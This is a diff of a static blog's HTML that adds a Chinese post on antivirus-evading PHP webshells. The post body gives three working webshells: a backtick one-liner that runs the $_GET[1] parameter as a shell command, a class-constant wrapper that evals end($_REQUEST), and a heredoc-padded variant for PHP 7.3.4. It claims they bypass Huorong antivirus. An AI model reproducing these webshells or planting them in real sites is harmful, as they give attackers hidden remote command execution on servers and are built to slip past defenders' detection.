@@ -6,15 +6,25 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://example.com">
-  <title>Tag: Android | Solkatt的小窝</title>
+  <title>PHP下的几种免杀Webshell | Solkatt的小窝</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Solkatt的小窝">
-<meta property="og:url" content="https://example.com/tags/Android/index.html">
+  <meta name="description" content="重音符下的PHP在PHP中，当你写一个集合等于一个用重音符包裹的字符串的变量时，它将像在shell_exec()命令内一样被执行。 https:&#x2F;&#x2F;www.nuomiphp.com&#x2F;eplan&#x2F;437635.html。具体的原因我们也不深究，只需要知道它的功能就是可以执行命令，同时它的木马也很简单，只需要轻轻松松的一句话。 1&lt;?&#x3D;&#96;$_GET[1]&#96;;  免杀效果也是杠杠的：  也能够执行">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP下的几种免杀Webshell">
+<meta property="og:url" content="https://example.com/2022/10/14/%E5%85%8D%E6%9D%80Webshell/index.html">
 <meta property="og:site_name" content="Solkatt的小窝">
+<meta property="og:description" content="重音符下的PHP在PHP中，当你写一个集合等于一个用重音符包裹的字符串的变量时，它将像在shell_exec()命令内一样被执行。 https:&#x2F;&#x2F;www.nuomiphp.com&#x2F;eplan&#x2F;437635.html。具体的原因我们也不深究，只需要知道它的功能就是可以执行命令，同时它的木马也很简单，只需要轻轻松松的一句话。 1&lt;?&#x3D;&#96;$_GET[1]&#96;;  免杀效果也是杠杠的：  也能够执行">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221014160329227.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221014160341372.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221014161725215.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221014161811974.png">
+<meta property="article:published_time" content="2022-10-14T07:26:57.000Z">
+<meta property="article:modified_time" content="2022-10-14T08:20:32.495Z">
 <meta property="article:author" content="Solkatt">
+<meta property="article:tag" content="萌新免杀的故事">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221014160329227.png">
   
     <link rel="alternative" href="/atom.xml" title="Solkatt的小窝" type="application/atom+xml">
   
@@ -142,136 +152,161 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-免杀Webshell" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      PHP下的几种免杀Webshell
+    </h1>
+  
+
+        
+        <a href="/2022/10/14/%E5%85%8D%E6%9D%80Webshell/" class="archive-article-date">
+  	<time datetime="2022-10-14T07:26:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-10-14</time>
+</a>
+        
+      </header>
     
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="重音符下的PHP"><a href="#重音符下的PHP" class="headerlink" title="重音符下的PHP"></a>重音符下的PHP</h1><p>在PHP中，当你写一个集合等于一个用重音符包裹的字符串的变量时，它将像在<code>shell_exec()</code>命令内一样被执行。</p>
+<p><a target="_blank" rel="noopener" href="https://www.nuomiphp.com/eplan/437635.html%E3%80%82%E5%85%B7%E4%BD%93%E7%9A%84%E5%8E%9F%E5%9B%A0%E6%88%91%E4%BB%AC%E4%B9%9F%E4%B8%8D%E6%B7%B1%E7%A9%B6%EF%BC%8C%E5%8F%AA%E9%9C%80%E8%A6%81%E7%9F%A5%E9%81%93%E5%AE%83%E7%9A%84%E5%8A%9F%E8%83%BD%E5%B0%B1%E6%98%AF%E5%8F%AF%E4%BB%A5%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%EF%BC%8C%E5%90%8C%E6%97%B6%E5%AE%83%E7%9A%84%E6%9C%A8%E9%A9%AC%E4%B9%9F%E5%BE%88%E7%AE%80%E5%8D%95%EF%BC%8C%E5%8F%AA%E9%9C%80%E8%A6%81%E8%BD%BB%E8%BD%BB%E6%9D%BE%E6%9D%BE%E7%9A%84%E4%B8%80%E5%8F%A5%E8%AF%9D%E3%80%82">https://www.nuomiphp.com/eplan/437635.html。具体的原因我们也不深究，只需要知道它的功能就是可以执行命令，同时它的木马也很简单，只需要轻轻松松的一句话。</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>`<span class="variable">$_GET</span>[<span class="number">1</span>]`;</span><br></pre></td></tr></table></figure>
+
+<p>免杀效果也是杠杠的：</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221014160329227.png" alt="image-20221014160329227"></p>
+<p>也能够执行。</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221014160341372.png" alt="image-20221014160341372"></p>
+<h1 id="使用类的Webshell"><a href="#使用类的Webshell" class="headerlink" title="使用类的Webshell"></a>使用类的Webshell</h1><p>使用类的webshell是老生长谈的话题了。同样这个也能过掉火绒并且正常使用。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"><span class="keyword">const</span> name=<span class="string">&#x27;eval(end($_REQUEST));&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(test::name);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221014161725215.png" alt="image-20221014161725215"></p>
+<h1 id="使用PHP版本差异的方法"><a href="#使用PHP版本差异的方法" class="headerlink" title="使用PHP版本差异的方法"></a>使用PHP版本差异的方法</h1><p>php 7.3.4的版本下，在<code>;</code>号下可以解析传过来的参数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&lt;&lt;&lt; aa</span></span><br><span class="line"><span class="string">assasssasssasssasssasssasssasssasssasssasssassss</span></span><br><span class="line"><span class="string">aa</span>;<span class="keyword">echo</span> `<span class="variable">$_GET</span>[<span class="number">1</span>]`</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221014161811974.png" alt="image-20221014161811974"></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
       
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2022" class="archive-year">2022</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/10/08/%E5%AE%89%E5%8D%93%E4%B9%8B%E8%B4%AA%E5%90%83%E8%9B%87%E7%A0%B4%E8%A7%A3/" class="archive-article-date">
-  	<time datetime="2022-10-08T03:20:06.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-10-08</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/10/08/%E5%AE%89%E5%8D%93%E4%B9%8B%E8%B4%AA%E5%90%83%E8%9B%87%E7%A0%B4%E8%A7%A3/">安卓之贪吃蛇破解</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Android</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">萌新免杀的故事</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=https://example.com/2022/10/14/%E5%85%8D%E6%9D%80Webshell/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/10/03/%E5%AE%89%E5%8D%93%E5%9B%9B%E5%A4%A7%E4%BB%B6/" class="archive-article-date">
-  	<time datetime="2022-10-03T02:31:05.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-10-03</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2022/10/08/%E5%AE%89%E5%8D%93%E4%B9%8B%E8%B4%AA%E5%90%83%E8%9B%87%E7%A0%B4%E8%A7%A3/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">安卓之贪吃蛇破解</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/10/03/%E5%AE%89%E5%8D%93%E5%9B%9B%E5%A4%A7%E4%BB%B6/">安卓四大件</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Android</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/10/02/APK%E5%9F%BA%E7%A1%80/" class="archive-article-date">
-  	<time datetime="2022-10-02T06:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-10-02</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/10/02/APK%E5%9F%BA%E7%A1%80/">APK基础</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Android</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
   
 
-    
+  
 
 
           </div>
@@ -294,9 +329,9 @@
 	var yiliaConfig = {
 		mathjax: true,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
